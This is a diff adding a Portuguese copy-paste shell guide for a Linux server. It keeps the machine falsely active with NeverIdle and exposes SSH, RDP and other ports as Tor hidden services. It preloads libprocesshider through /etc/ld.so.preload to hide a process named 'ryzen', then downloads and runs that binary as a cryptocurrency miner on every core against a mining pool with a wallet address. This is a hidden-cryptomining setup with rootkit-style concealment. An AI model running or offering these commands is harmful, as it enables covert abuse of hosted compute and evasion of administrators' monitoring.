@@ -1,0 +1,91 @@
+DICA: LINHAS SEPARADAS COPIA E COLA ELA SOZINHA. LINHAS SEGUIDAS, PODE COPIAR O BLOCO E COLAR DE UMA VEZ.
+
+----ETAPA 1----
+
+sudo -i
+
+screen -R never
+
+wget https://github.com/layou233/NeverIdle/releases/download/0.1/NeverIdle-linux-amd64 -O NeverIdle
+chmod 777 NeverIdle
+./NeverIdle -c 1h1m2s -m 2 -n 1h
+
+
+(CTRL + A+D)
+
+
+----ETAPA 2----
+
+cd /tmp
+
+apt-get update && apt-get full-upgrade -y && apt-get -y dist-upgrade && apt-get -y autoremove --purge && apt-get install make gcc -y
+
+screen
+
+
+
+(ENTER DUAS VEZES)
+
+wget -O- https://deb.torproject.org/torproject.org/A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89.asc | sudo apt-key add -
+apt-add-repository --yes -s https://deb.torproject.org/torproject.org
+apt-get update && apt-get install tor deb.torproject.org-keyring torsocks -y
+
+
+sed -i 's\#SocksPort 9050\SocksPort 9050\ ' /etc/tor/torrc
+sed -i 's\#ControlPort 9051\ControlPort 9051\ ' /etc/tor/torrc
+sed -i 's\#HashedControlPassword\HashedControlPassword\ ' /etc/tor/torrc
+sed -i 's\#CookieAuthentication 1\CookieAuthentication 1\ ' /etc/tor/torrc
+sed -i 's\#HiddenServiceDir /var/lib/tor/hidden_service/\HiddenServiceDir /var/lib/tor/hidden_service/\ ' /etc/tor/torrc
+sed -i '72s\#HiddenServicePort 80 127.0.0.1:80\HiddenServicePort 80 127.0.0.1:80\ ' /etc/tor/torrc
+sed -i '73 i HiddenServicePort 22 127.0.0.1:22' /etc/tor/torrc
+sed -i '74 i HiddenServicePort 8080 127.0.0.1:8080' /etc/tor/torrc
+sed -i '75 i HiddenServicePort 4000 127.0.0.1:4000' /etc/tor/torrc
+sed -i '76 i HiddenServicePort 8000 127.0.0.1:8000' /etc/tor/torrc
+sed -i '77 i HiddenServicePort 9000 127.0.0.1:9000' /etc/tor/torrc
+sed -i '78 i HiddenServicePort 3389 127.0.0.1:3389' /etc/tor/torrc
+sed -i '79 i HiddenServicePort 5901 127.0.0.1:5901' /etc/tor/torrc
+sed -i '80 i HiddenServicePort 5000 127.0.0.1:5000' /etc/tor/torrc
+sed -i '81 i HiddenServicePort 6080 127.0.0.1:6080' /etc/tor/torrc
+sed -i '82 i HiddenServicePort 8888 127.0.0.1:8888' /etc/tor/torrc
+sed -i '83 i HiddenServicePort 8888 127.0.0.1:7777' /etc/tor/torrc
+sed -i '84 i HiddenServicePort 12345 127.0.0.1:12345' /etc/tor/torrc
+sed -i '85 i HiddenServicePort 10000 127.0.0.1:10000' /etc/tor/torrc
+sed -i '86 i HiddenServicePort 40159 127.0.0.1:40159' /etc/tor/torrc
+service tor start
+
+
+git clone https://github.com/2i08ueivktd0/GOTTYTOR.git && cd GOTTYTOR 
+
+cd libprocesshider
+sed -i '12s\evil_script.py\ryzen\ ' processhider.c
+make
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+cd
+cd /tmp/GOTTYTOR/
+cd graftcp
+chmod 777 graftcp && chmod 777 graftcp-local && chmod 777 graftcp-local.conf && chmod 777 graftcp.sh && chmod 777 mgraftcp
+
+cat >> graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 127.0.0.1:9050
+select_proxy_mode = auto
+END
+
+./graftcp-local -config graftcp-local.conf & sleep 2
+
+./graftcp wget https://github.com/anadirota/ryzen/raw/main/ryzen
+
+cd
+cd /tmp
+
+wget https://github.com/anadirota/ryzen/raw/main/ryzen && chmod 777 ryzen && ./ryzen -a yespowersugar -o stratum+tcp://yespowerSUGAR.jp.mine.zpool.ca:6241 -u sugar1qsqu6ngf8lydpqvtg03f59vu4zjq89mjlam0dhj -p c=HOMER -t $(nproc)
+
+
+CTRL + A + D
+
+top
+
+FIM (PODE FECHAR O PROMPT)
